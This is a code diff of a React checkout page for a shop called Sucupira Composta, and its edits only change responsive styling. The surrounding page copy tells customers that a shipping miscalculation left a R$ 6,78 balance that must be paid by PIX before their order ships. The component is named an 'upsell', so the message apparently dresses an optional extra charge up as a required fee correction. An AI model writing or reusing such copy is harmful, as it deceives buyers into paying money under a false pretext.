@@ -157,8 +157,8 @@ function ShippingUpsellPage() {
         <style>{`@keyframes upsell-loading { 0% { transform: translateX(-110%); } 100% { transform: translateX(330%); } } @keyframes upsell-screen-out { 0%, 92% { opacity: 1; visibility: visible; } 100% { opacity: 0; visibility: hidden; pointer-events: none; } }`}</style>
       </div>
 
-      <header className="border-b bg-white px-4 py-4 text-center font-bold tracking-wide">SUCUPIRA COMPOSTA</header>
-      <main className="mx-auto max-w-xl px-4 py-8 md:py-12">
+      <header className="border-b bg-white px-3 py-3 sm:px-4 sm:py-4 text-center text-sm sm:text-base font-bold tracking-wide">SUCUPIRA COMPOSTA</header>
+      <main className="mx-auto max-w-xl px-3 py-4 sm:px-4 sm:py-8 md:py-12">
         {preview && <div className="mb-4 rounded-xl border border-blue-200 bg-blue-50 px-4 py-3 text-center text-sm font-medium text-blue-900">Pré-visualização: esta tela abre sem validar pagamento e não permite gerar cobranças.</div>}
         <div className="overflow-hidden rounded-3xl border bg-white shadow-sm">
           <div className="bg-gradient-to-br from-emerald-900 via-emerald-800 to-emerald-700 px-6 py-8 text-white">
@@ -166,7 +166,7 @@ function ShippingUpsellPage() {
             <h1 className="text-2xl font-extrabold leading-tight md:text-3xl">Identificamos uma divergência no valor calculado do frete do seu pedido.</h1>
             <p className="mt-2 text-sm leading-relaxed text-emerald-50">Pedimos desculpas pelo transtorno. Encontramos uma diferença entre o valor de frete calculado inicialmente e o custo necessário para concluir o envio. O saldo de R$ 6,78 corresponde a essa diferença e precisa ser regularizado para que possamos liberar a expedição do pedido.</p>
           </div>
-          <div className="space-y-6 p-6 md:p-8">
+          <div className="space-y-4 sm:space-y-6 p-4 sm:p-6 md:p-8">
             {!preview && pending && !originalStatus.data?.paid && <div className="rounded-xl border p-4 text-sm text-slate-600">{originalStatus.isError ? "Não foi possível consultar o pedido principal. A geração em modo de teste depende da configuração do servidor." : "Pedido principal ainda não confirmado. A geração de teste depende da configuração do servidor."}</div>}
             {!preview && pending && originalStatus.data?.paid && !originalStatus.data.eligible && <div className="rounded-xl border p-4 text-sm text-slate-600">Este pedido não está elegível para gerar um novo complemento.</div>}
 
@@ -182,7 +182,7 @@ function ShippingUpsellPage() {
                   <p className="mt-1 text-4xl font-extrabold tabular-nums text-emerald-800">{money(payment.amount)}</p>
                   <p className="mt-2 text-xs text-slate-500">PIX gerado pela Fruitfy • válido até {new Date(payment.pix.expires_at).toLocaleString("pt-BR")}</p>
                 </div>
-                {qrUrl ? <img src={qrUrl} alt="QR Code PIX do complemento" className="mx-auto h-56 w-56 rounded-lg border bg-white p-2"/> : <div className="mx-auto flex h-56 w-56 items-center justify-center rounded-lg border bg-slate-50"><QrCode size={48} className="text-slate-400"/></div>}
+                {qrUrl ? <img src={qrUrl} alt="QR Code PIX do complemento" className="mx-auto h-48 w-48 max-w-full rounded-lg border bg-white p-2 sm:h-56 sm:w-56"/> : <div className="mx-auto flex h-48 w-48 max-w-full items-center justify-center rounded-lg border bg-slate-50 sm:h-56 sm:w-56"><QrCode size={48} className="text-slate-400"/></div>}
                 <p className="flex items-center justify-center gap-2 text-sm text-slate-600"><Clock3 size={16}/> Consulte o prazo no aplicativo do seu banco.</p>
                 <Button onClick={copyPix} className="h-auto min-h-12 w-full whitespace-normal px-3 py-3 text-center text-sm font-bold leading-tight bg-emerald-700 hover:bg-emerald-800"><Clipboard size={17} className="mr-2"/>{copied ? "PIX copiado!" : "Copiar PIX para pagar e confirmar pedido"}</Button>
                 <div className="rounded-xl bg-slate-50 p-3 text-left"><p className="mb-2 text-xs font-bold uppercase text-slate-500">Código PIX copia e cola</p><textarea readOnly value={payment.pix.code} className="min-h-24 w-full resize-y break-all rounded-lg border bg-white p-3 text-xs text-slate-700"/></div>
@@ -208,7 +208,7 @@ function ShippingUpsellPage() {
             <div className="flex items-start gap-2 border-t pt-4 text-xs leading-relaxed text-slate-500"><ShieldCheck size={16} className="shrink-0 text-emerald-700"/> Pagamento processado pela Fruitfy. A regularização do saldo de frete é necessária para liberar a expedição do pedido.</div>
           </div>
         </div>
-        <footer className="mt-8 border-t border-slate-200 px-4 py-5 text-center text-sm leading-relaxed text-slate-500"><p className="font-semibold text-slate-600">Sucupira Composta</p><p className="mt-1 text-xs">Atendimento ao cliente • Informações e suporte sobre seu pedido</p></footer>
+        <footer className="mt-5 border-t border-slate-200 px-3 py-4 text-center text-xs sm:text-sm leading-relaxed text-slate-500"><p className="font-semibold text-slate-600">Sucupira Composta</p><p className="mt-1 text-xs">Atendimento ao cliente • Informações e suporte sobre seu pedido</p></footer>
       </main>
     </div>
   );
